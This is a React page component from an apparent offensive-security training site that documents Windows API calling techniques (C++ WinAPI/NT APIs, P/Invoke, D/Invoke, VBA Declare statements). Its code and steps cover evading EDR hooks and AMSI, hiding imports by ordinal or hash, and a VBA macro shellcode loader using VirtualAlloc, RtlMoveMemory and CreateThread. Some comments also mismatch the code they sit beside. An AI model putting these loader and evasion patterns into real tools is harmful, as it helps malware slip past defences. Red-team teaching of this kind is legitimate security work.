import React from 'react';
import ArchitectureMap from '../components/ArchitectureMap';
import TechniqueCard from '../components/TechniqueCard';

const mapColumns = [
  {
    header: 'DIRECT API CALLS',
    color: 'red',
    nodes: [
      { title: 'WinAPI (C++)', subtitle: 'CreateProcess • MessageBox • NT APIs', id: 'winapi-cpp' },
      { title: 'P/Invoke (C#)', subtitle: 'DllImport • marshalling • ordinals', id: 'pinvoke' },
    ]
  },
  {
    header: 'DYNAMIC INVOCATION',
    color: 'orange',
    nodes: [
      { title: 'D/Invoke', subtitle: 'Dynamic invocation • API hashing', id: 'dinvoke' },
      { title: 'VBA WinAPI', subtitle: 'MessageBox • CreateProcess in VBA', id: 'vba-api' },
    ]
  },
  {
    header: 'ERROR HANDLING',
    color: 'yellow',
    nodes: [
      { title: 'Error Handling', subtitle: 'GetLastError • NTSTATUS • exceptions', id: 'error-handling' },
    ]
  },
];

const techniques = [
  {
    id: 'winapi-cpp',
    title: 'Windows API in C++ — WinAPI & NT APIs',
    subtitle: 'Call Win32 and NT native APIs directly from C++ for offensive tooling development',
    tags: ['WinAPI', 'C++', 'NT APIs', 'CreateProcess', 'NtAllocateVirtualMemory', 'ordinals'],
    accentColor: 'red',
    overview: 'Win32 APIs are the standard interface to Windows but are heavily hooked by EDR. NT APIs in ntdll.dll sit one layer closer to the kernel and are less commonly monitored, making them preferred for offensive tooling.',
    steps: [
      'Use Win32 APIs (kernel32.dll) for prototyping — well documented with straightforward C++ calling conventions',
      'Prefer NT APIs (Nt/Zw prefix in ntdll.dll) for sensitive operations — fewer EDR hooks, closer to the kernel',
      'Include winternl.h and define missing NT API typedefs manually; link against ntdll.lib or resolve at runtime',
      'Fill OBJECT_ATTRIBUTES and UNICODE_STRING structures manually when calling NT APIs that require them',
      'Resolve sensitive functions by ordinal (GetProcAddress with "#1234") to avoid leaving their string names in the import table',
      'Compile with cl.exe or MinGW; pass -lntdll when linking against NT functions directly',
    ],
    commands: [
      {
        title: 'WinAPI and NT API usage in C++',
        code: `// Win32 API — CreateProcess
#include <windows.h>

int main() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    CreateProcess(
        L"C:\\Windows\\System32\\calc.exe",   // Application
        NULL,                                   // Command line
        NULL, NULL,                             // Process/thread attrs
        FALSE,                                  // Inherit handles
        CREATE_NEW_CONSOLE,                     // Creation flags
        NULL, NULL,                             // Env, dir
        &si, &pi
    );
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return 0;
}

// NT API — NtCreateProcess (lower level)
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList
);

// Resolve by ordinal (avoids string "NtCreateThreadEx" in import table)
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
FARPROC pFunc = GetProcAddress(hNtdll, "NtCreateThreadEx");

// Compile: cl.exe tool.cpp /link /out:tool.exe
// MinGW: x86_64-w64-mingw32-g++ tool.cpp -o tool.exe -lntdll`
      }
    ]
  },
  {
    id: 'pinvoke',
    title: 'P/Invoke — Calling Win32 APIs from C#',
    subtitle: 'Use Platform Invoke to call unmanaged Win32/NT functions from managed .NET code',
    tags: ['P/Invoke', 'DllImport', 'C#', 'type marshalling', 'IntPtr', 'unsafe'],
    accentColor: 'red',
    overview: 'P/Invoke allows C# to call unmanaged Win32 and NT functions using the DllImport attribute. AMSI can scan P/Invoke declarations in .NET assemblies, so sensitive calls should be moved to D/Invoke.',
    steps: [
      'Declare each Win32 function with [DllImport("kernel32.dll", SetLastError = true)] above a matching static extern method',
      'Map Win32 types to .NET equivalents: DWORD → uint, HANDLE → IntPtr, LPWSTR → string, void* → IntPtr',
      'Use [MarshalAs] and [StructLayout(LayoutKind.Sequential)] for structs passed by reference',
      'Set SetLastError = true on every DllImport so Marshal.GetLastWin32Error() works after failures',
      'For NT APIs, use DllImport("ntdll.dll") with the matching Nt* function signature',
      'Use ordinal-based P/Invoke (EntryPoint = "#1656") to avoid the function name appearing in IL metadata',
      'Replace DllImport entirely with D/Invoke delegates for sensitive calls to eliminate import table entries',
    ],
    commands: [
      {
        title: 'P/Invoke declarations and usage',
        code: `// C# P/Invoke — WinAPI declarations
using System;
using System.Runtime.InteropServices;

class WinApi {
    // CreateProcess
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation
    );
    
    // VirtualAlloc
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect
    );
    
    // NT API — NtWriteVirtualMemory
    [DllImport("ntdll.dll")]
    static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle, IntPtr BaseAddress,
        byte[] Buffer, uint NumberOfBytesToWrite,
        ref uint NumberOfBytesWritten
    );
    
    // Type marshalling example
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public uint dwProcessId, dwThreadId;
    }
    
    // Usage
    static void Main() {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, 4096, 0x3000, 0x40); // MEM_COMMIT|RESERVE, RWX
        // Copy shellcode to mem
        // ...
    }
}`
      },
      {
        title: 'Ordinal-based P/Invoke',
        code: `// Ordinal P/Invoke — avoids function name string in .NET assembly
// Useful when strings like "VirtualAlloc" are AMSI-scanned

// Find ordinal with: dumpbin /exports kernel32.dll | findstr VirtualAlloc
// VirtualAlloc ordinal in kernel32.dll = 1656 (varies by Windows version)

[DllImport("kernel32.dll", EntryPoint = "#1656")]
static extern IntPtr VirtualAllocOrd(
    IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect
);

// Or define a delegate and use D/Invoke instead (better approach)
// Delegate avoids all import table entries

public delegate IntPtr VirtualAllocDelegate(
    IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect
);

// Resolve dynamically:
IntPtr funcAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
VirtualAllocDelegate VirtualAlloc = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(funcAddr);
IntPtr mem = VirtualAlloc(IntPtr.Zero, 4096, 0x3000, 0x40);`
      }
    ]
  },
  {
    id: 'dinvoke',
    title: 'D/Invoke — Dynamic API Invocation',
    subtitle: 'Call Win32/NT APIs without P/Invoke import table entries using delegates',
    tags: ['D/Invoke', 'API hashing', 'delegates', 'dynamic invocation', 'ordinals', 'SharpSploit'],
    accentColor: 'orange',
    overview: 'D/Invoke resolves function addresses at runtime using delegates, leaving no DllImport entries in the .NET IL that AMSI or EDR can inspect. API hashing extends this by removing all function name strings from the binary.',
    steps: [
      'Define a delegate type matching the target Win32 function signature with [UnmanagedFunctionPointer(CallingConvention.StdCall)]',
      'Resolve the function address at runtime via GetProcAddress or manual Export Address Table (EAT) walking',
      'Create a callable delegate from the pointer with Marshal.GetDelegateForFunctionPointer<T>(addr)',
      'Invoke the delegate — no DllImport attribute exists in the assembly, leaving no import table entry',
      'Upgrade to API hashing: pre-compute a CRC32/DJB2 hash of each target function name; walk the EAT comparing hashes — eliminates all function name strings from the binary',
      'Use manual DLL mapping to load a fresh copy of ntdll.dll from disk into a private buffer, bypassing in-memory EDR hooks',
    ],
    commands: [
      {
        title: 'D/Invoke implementation',
        code: `// D/Invoke — dynamic function resolution without DllImport
using System;
using System.Runtime.InteropServices;
using System.Reflection;

class DInvoke {
    // Step 1: Define a delegate for the function signature
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect
    );
    
    // Step 2: Resolve the function address at runtime
    static IntPtr GetFuncAddr(string module, string funcName) {
        IntPtr hModule = LoadLibrary(module);  // Or use existing handle
        return GetProcAddress(hModule, funcName);
    }
    
    // Helper imports (only these appear in import table — benign)
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string name);
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lib);
    
    static void Main() {
        // Step 3: Get function pointer
        IntPtr funcAddr = GetFuncAddr("kernel32.dll", "VirtualAlloc");
        
        // Step 4: Create delegate from pointer
        VirtualAllocDelegate VirtualAlloc = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(funcAddr);
        
        // Step 5: Call the function — no import table entry for VirtualAlloc
        IntPtr mem = VirtualAlloc(IntPtr.Zero, 4096, 0x3000, 0x40);
    }
}

// API Hashing version — resolve by CRC32 hash (no string "VirtualAlloc" anywhere)
// Hash of "VirtualAlloc" = 0xE553A458 (example)
// Walk EAT of kernel32.dll, compute hash of each name, match against 0xE553A458
// Return the function address when hash matches`
      }
    ]
  },
  {
    id: 'vba-api',
    title: 'VBA WinAPI Calls',
    subtitle: 'Declare and call Win32 APIs directly from VBA macros in Office documents',
    tags: ['VBA', 'Declare', 'CreateProcess', 'MessageBox', 'Win32 from VBA', 'Office'],
    accentColor: 'orange',
    overview: 'VBA macros in Office documents can declare and call Win32 APIs directly using the Declare statement, enabling shellcode execution from a document without any external binary. AMSI scans VBA since Office 2016, so an inline AMSI bypass is required.',
    steps: [
      'Add the #If VBA7 conditional block to use PtrSafe Declare for 64-bit Office; without it the macro errors on 64-bit hosts',
      'Declare each Win32 function with Declare PtrSafe Function, mapping types: Long for DWORD/HANDLE, LongPtr for pointers, Any for void*',
      'Run an AMSI bypass sub at the very start of the macro — AMSI has scanned VBA in Office 2016+ and will flag shellcode allocation calls',
      'Allocate shellcode memory with VirtualAlloc (use RW + VirtualProtect to RX; avoid RWX for OPSEC)',
      'Copy shellcode bytes into the allocation with RtlMoveMemory',
      'Create and execute a thread at the shellcode address with CreateThread, then wait for it to complete',
    ],
    commands: [
      {
        title: 'VBA WinAPI declarations',
        code: `' VBA WinAPI — CreateProcess and shellcode execution
#If VBA7 Then
    Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" ( _
        ByVal lpApplicationName As String, _
        ByVal lpCommandLine As String, _
        lpProcessAttributes As SECURITY_ATTRIBUTES, _
        lpThreadAttributes As SECURITY_ATTRIBUTES, _
        ByVal bInheritHandles As Boolean, _
        ByVal dwCreationFlags As Long, _
        lpEnvironment As Any, _
        ByVal lpCurrentDirectory As String, _
        lpStartupInfo As STARTUPINFO, _
        lpProcessInformation As PROCESS_INFORMATION) As Long

    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long)

    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        lpThreadAttributes As Any, ByVal dwStackSize As Long, _
        ByVal lpStartAddress As LongPtr, lpParameter As Any, _
        ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
#End If

Sub RunShellcode()
    Dim sc() As Byte
    sc = Array(...)  ' Shellcode bytes
    
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(sc), &H3000, &H40)  ' MEM_COMMIT|RESERVE, RWX
    RtlMoveMemory addr, sc(0), UBound(sc)
    
    Dim tid As Long
    CreateThread ByVal 0&, 0, addr, ByVal 0&, 0, tid
End Sub`
      }
    ]
  },
  {
    id: 'error-handling',
    title: 'Windows Error Handling',
    subtitle: 'Correctly handle errors from Win32 and NT API calls in offensive C++/C# tools',
    tags: ['GetLastError', 'NTSTATUS', 'FormatMessage', 'error codes', 'NT_SUCCESS'],
    accentColor: 'yellow',
    overview: 'Correct error handling is critical in offensive tools — silent failures cause unpredictable behaviour and can burn an operation. Always check return values immediately and call GetLastError before any other API.',
    steps: [
      'Check every Win32 return value immediately: NULL / FALSE / INVALID_HANDLE_VALUE all indicate failure',
      'Call GetLastError() as the very next statement after a failure — any subsequent API call overwrites the error code',
      'Pass the DWORD to FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM) to convert it to a human-readable string',
      'For NT API calls check NT_SUCCESS(status) — any NTSTATUS value ≥ 0 is success; negative values are errors',
      'In C#: ensure SetLastError = true on the DllImport declaration, then call Marshal.GetLastWin32Error() (not Environment.GetLastWin32Error())',
      'Map common codes early: 0x5 = Access Denied, 0x57 = Invalid Parameter, 0xC0000022 = STATUS_ACCESS_DENIED',
    ],
    commands: [
      {
        title: 'Error handling patterns',
        code: `// C++ Win32 error handling
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
    DWORD err = GetLastError();
    // Format message
    LPSTR msg = NULL;
    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, err, 0, (LPSTR)&msg, 0, NULL);
    printf("OpenProcess failed: %d - %s\n", err, msg);
    LocalFree(msg);
    return -1;
}

// NTSTATUS error handling (NT APIs)
NTSTATUS status = NtAllocateVirtualMemory(hProcess, &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
if (!NT_SUCCESS(status)) {  // NT_SUCCESS = (status >= 0)
    printf("NtAllocateVirtualMemory failed: 0x%08X\n", status);
    // Common NTSTATUS codes:
    // 0xC0000005 = STATUS_ACCESS_VIOLATION
    // 0xC0000022 = STATUS_ACCESS_DENIED
    // 0xC000000D = STATUS_INVALID_PARAMETER
    return -1;
}

// C# error handling
[DllImport("kernel32.dll", SetLastError = true)]  // SetLastError=true is required!
static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);

IntPtr hProcess = OpenProcess(0x1FFFFF, false, targetPid);
if (hProcess == IntPtr.Zero) {
    int err = Marshal.GetLastWin32Error();  // NOT Environment.GetLastWin32Error()
    Console.WriteLine($"OpenProcess failed: {err}");
}`
      }
    ]
  },
];

export default function WindowsAPIs() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Windows </span><span className="text-red-400">APIs</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">WinAPI C++ • P/Invoke • D/Invoke • VBA APIs • Error Handling</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}